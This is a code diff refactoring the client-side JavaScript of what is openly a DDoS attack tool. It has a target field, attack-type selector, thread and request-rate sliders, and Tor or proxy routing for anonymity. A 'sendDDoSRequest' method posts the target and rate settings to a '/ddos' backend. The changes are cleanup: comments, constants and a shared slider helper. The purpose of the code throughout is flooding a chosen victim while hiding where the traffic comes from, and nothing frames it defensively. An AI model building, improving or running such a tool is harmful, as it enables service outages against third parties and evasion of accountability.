@@ -1,5 +1,6 @@
 class DDoS {
  constructor() {
+  // UI Elements
   this.logArea = this.createLogArea();
   this.targetInput = this.createTargetInput();
   this.attackTypeSelect = this.createAttackTypeSelect();
@@ -16,30 +17,38 @@ class DDoS {
   this.sidePanel = this.createSidePanel();
   this.aboutUs = this.createAboutUs();
 
-  this.appendElements();
-  this.setupEventListeners();
-  this.initializeValues();
-  this.setupUI();
-
+  // Slider Input Elements
   this.threadSliderInput = this.threadSlider.querySelector('input');
   this.threadSliderValue = this.threadSlider.querySelector('.noodle-slider-value');
   this.requestRateSliderInput = this.requestRateSlider.querySelector('input');
   this.requestRateSliderValue = this.requestRateSlider.querySelector('.noodle-slider-value');
   this.torToggleInput = this.torToggle.querySelector('input');
 
+  this.appendElements();
+  this.setupEventListeners();
+  this.initializeValues();
+  this.setupUI();
+
+  // Attack State
   this.attackRunning = false;
  }
 
  initializeValues() {
-  this.torProxy = 'socks5://127.0.0.1:9050';
+  // Constants
+  this.TOR_PROXY = 'socks5://127.0.0.1:9050';
+  this.ATTACK_TIMEOUT = 60000; // 60 seconds
+
+  // Generated Keys
   this.Key = this.generateKey();
   this.encryptionKey = this.generateEncryptionKey();
   this.log(` Key generated: ${this.Key}`);
   this.log(`Encryption Key generated: ${this.encryptionKey}`);
 
+  // Proxy Management
   this.availableProxies = [];
   this.refreshProxies();
 
+  // Attack Statistics
   this.packetsSent = 0;
   this.mbps = 0;
   this.connectionStatus = 'Idle';
@@ -47,6 +56,8 @@ class DDoS {
   this.dataSent = 0;
   this.activeThreads = 0;
   this.attackStartTime = null;
+
+  // Configuration Variables
   this.requestRate = 50;
   this.isTorEnabled = false;
   this.maxThreads = 100;
@@ -61,13 +72,18 @@ class DDoS {
   this.toggleCustomCodeArea();
   this.autoFillTarget();
 
+  // Initialize Slider Values
   this.threadSliderInput.value = this.maxThreads;
   this.requestRateSliderInput.value = this.requestRate;
-  this.stopButton.disabled = true;
 
+  // Update Displayed Slider Values
   this.threadSliderValue.textContent = this.maxThreads;
   this.requestRateSliderValue.textContent = this.requestRate;
 
+  // Disable Start Button Initially
+  this.stopButton.disabled = true;
+
+  // Start Stats Interval
   this.statsInterval = setInterval(() => this.updateStats(), 1000);
  }
 
@@ -89,6 +105,7 @@ class DDoS {
 
   mainElements.forEach(element => this.container.appendChild(element));
 
+  // Append Containers to Body
   document.body.appendChild(this.container);
   document.body.appendChild(this.sidePanel);
   document.body.appendChild(this.aboutUs);
@@ -101,61 +118,47 @@ class DDoS {
   this.proxyRefreshButton.addEventListener('click', () => this.refreshProxies());
   this.torToggleInput.addEventListener('change', () => this.toggleTor());
 
-  this.threadSliderInput.addEventListener('input', () => {
-   this.maxThreads = parseInt(this.threadSliderInput.value);
-   this.threadSliderValue.textContent = this.maxThreads;
-  });
+  this.threadSliderInput.addEventListener('input', () => this.updateThreadCount());
+  this.requestRateSliderInput.addEventListener('input', () => this.updateRequestRate());
+ }
 
-  this.requestRateSliderInput.addEventListener('input', () => {
-   this.requestRate = parseInt(this.requestRateSliderInput.value);
-   this.requestRateSliderValue.textContent = this.requestRate;
-  });
+ updateThreadCount() {
+  this.maxThreads = parseInt(this.threadSliderInput.value);
+  this.threadSliderValue.textContent = this.maxThreads;
+ }
+
+ updateRequestRate() {
+  this.requestRate = parseInt(this.requestRateSliderInput.value);
+  this.requestRateSliderValue.textContent = this.requestRate;
  }
 
  createRequestRateSlider() {
-  const sliderContainer = document.createElement('div');
-  sliderContainer.classList.add('noodle-slider-container');
-
-  const label = document.createElement('label');
-  label.textContent = 'Request Rate (req/s): ';
-  label.classList.add('noodle-label');
-  sliderContainer.appendChild(label);
-
-  const slider = document.createElement('input');
-  slider.type = 'range';
-  slider.min = '10';
-  slider.max = '200';
-  slider.value = '50';
-  slider.classList.add('noodle-slider');
-  sliderContainer.appendChild(slider);
-
-  const valueDisplay = document.createElement('span');
-  valueDisplay.textContent = '50';
-  valueDisplay.classList.add('noodle-slider-value');
-  sliderContainer.appendChild(valueDisplay);
-
-  return sliderContainer;
+  return this.createSlider('Request Rate (req/s): ', 10, 200, 50);
  }
 
  createThreadSlider() {
+  return this.createSlider('Threads: ', 10, 500, 100);
+ }
+
+ createSlider(labelText, min, max, defaultValue) {
   const sliderContainer = document.createElement('div');
   sliderContainer.classList.add('noodle-slider-container');
 
   const label = document.createElement('label');
-  label.textContent = 'Threads: ';
+  label.textContent = labelText;
   label.classList.add('noodle-label');
   sliderContainer.appendChild(label);
 
   const slider = document.createElement('input');
   slider.type = 'range';
-  slider.min = '10';
-  slider.max = '500';
-  slider.value = '100';
+  slider.min = min;
+  slider.max = max;
+  slider.value = defaultValue;
   slider.classList.add('noodle-slider');
   sliderContainer.appendChild(slider);
 
   const valueDisplay = document.createElement('span');
-  valueDisplay.textContent = '100';
+  valueDisplay.textContent = defaultValue;
   valueDisplay.classList.add('noodle-slider-value');
   sliderContainer.appendChild(valueDisplay);
 
@@ -586,14 +589,14 @@ class DDoS {
   this.attackTimeout = setTimeout(() => {
    this.stopAttack();
    this.log('DDoS attack stopped automatically after 60 seconds.');
-  }, 60000);
+  }, this.ATTACK_TIMEOUT);
  }
 
  async sendDDoSRequest(target) {
   if (!this.attackRunning) return;
 
   try {
-   const proxy = this.isTorEnabled ? this.torProxy : this.proxyList.value;
+   const proxy = this.isTorEnabled ? this.TOR_PROXY : this.proxyList.value;
    const url = `/ddos?target=${encodeURIComponent(target)}&Key=${this.Key}&tor=${this.isTorEnabled}&proxy=${encodeURIComponent(proxy)}&rate=${this.requestRate}`;
    const response = await fetch(url, {
     method: 'POST'
